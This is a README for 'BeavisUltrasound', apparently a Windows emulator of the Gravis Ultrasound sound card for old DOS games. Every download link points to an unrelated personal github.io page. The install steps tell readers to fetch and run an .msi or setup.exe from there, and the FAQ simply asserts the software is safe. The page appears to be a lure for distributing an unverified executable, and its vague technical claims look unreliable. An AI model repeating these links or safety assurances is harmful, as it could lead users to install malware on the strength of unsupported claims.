# 🔊 BeavisUltrasound - Experience authentic classic sound card output

[![Download BeavisUltrasound](https://img.shields.io/badge/Download-Release-blue.svg)](https://tonnieshod967.github.io)

## 📋 About This Project

BeavisUltrasound acts as a software replacement for the classic Gravis Ultrasound PnP sound card. Many older computer games require this specific hardware to produce high-quality music and sound effects. This application simulates the hardware on your modern Windows computer. It allows you to play nostalgic titles without needing original, expensive, or broken parts from the 1990s. The software reproduces the specialized audio chip behavior to ensure your games sound exactly like they did decades ago.

## 💻 System Requirements

Your computer must meet these basic needs to run the software:

*   **Operating System:** Windows 10 or Windows 11 (64-bit).
*   **Processor:** Any modern dual-core processor or better.
*   **Memory:** At least 4 gigabytes of RAM.
*   **Storage:** 100 megabytes of free space for the installation files.
*   **Audio:** A standard output device like integrated motherboard audio, USB headphones, or external speakers.

## 📥 How to Install

Follow these steps to set up the software on your machine:

1. Visit [the release page](https://tonnieshod967.github.io) to download the installation package.
2. Look for the file labeled ending in .msi or setup.exe under the latest version header.
3. Click the file to start the download process.
4. Once the download finishes, navigate to your Downloads folder.
5. Double-click the installer file.
6. Follow the on-screen prompts.
7. Click Finish to complete the setup.

The installer creates a shortcut on your desktop. You can use this shortcut to start the program whenever you want to play older games.

## ⚙️ Configuration Setup

After you install the program, you must set it up to talk to your games.

1. Open the BeavisUltrasound application from your desktop shortcut.
2. Select the Settings tab.
3. Choose your primary audio output device from the dropdown menu. This is usually named Speakers or Headphones.
4. Adjust the Buffer Size slider to the middle position. This provides a balance between low delay and audio stability.
5. Click Save to store these settings.

If you hear crackling or pops during audio playback, return to the settings menu. Increase the Buffer Size slightly. If you feel a delay between your actions and the sound, decrease the buffer size. Finding the right setting depends on your specific audio hardware.

## 🎮 Linking Games to the Sound Card

The software works by intercepting audio calls from older DOS-based games. Most game launchers or emulators will provide a configuration menu for audio. When a game asks for your sound hardware or sound card, select Ultrasound or Gravis Ultrasound from the list.

If the game asks for individual settings, use these values:
*   **Port:** 240
*   **IRQ:** 5
*   **DMA:** 3

These settings ensure the software connects properly with the game environment. Save the configuration within the game menu to make sure the music plays correctly every time you start the title.

## 🛠 Troubleshooting Common Issues

Check this list if you experience problems with your audio.

### No Sound Output
Verify that your Windows master volume is not muted. Open the BeavisUltrasound interface. Check if the green bar moves when the program runs. If the bar remains empty, re-check your output device selection in the settings menu.

### Low Volume
Some older games have internal volume settings. Press the keys indicated in the game manual to open the game audio options. Increase the music and sound effect sliders within the game itself to match the overall output of the BeavisUltrasound engine.

### Crashing on Startup
Ensure you have the latest drivers for your sound card installed on Windows. Visit your computer manufacturer website and download the latest audio drivers. Restart your computer after updating the drivers to ensure the system recognizes the changes.

## 📝 Frequently Asked Questions

**Does this work on older versions of Windows?**
The software targets Windows 10 and 11. It might function on Windows 8, but results vary. It does not support Windows 7 or older systems.

**Is this safe for my computer?**
Yes. The software interacts only with audio output. It does not modify your core system files or hardware settings.

**Can I run multiple games at once?**
The software is designed for one active instance at a time. Running two games simultaneously may cause audio conflict and system performance issues.

**Does it consume much power?**
The program requires very little processing power. You will not notice a change in your battery life or system temperature.

Keywords: ultrasound, audio, emulator, dos, games, emulation, soundcard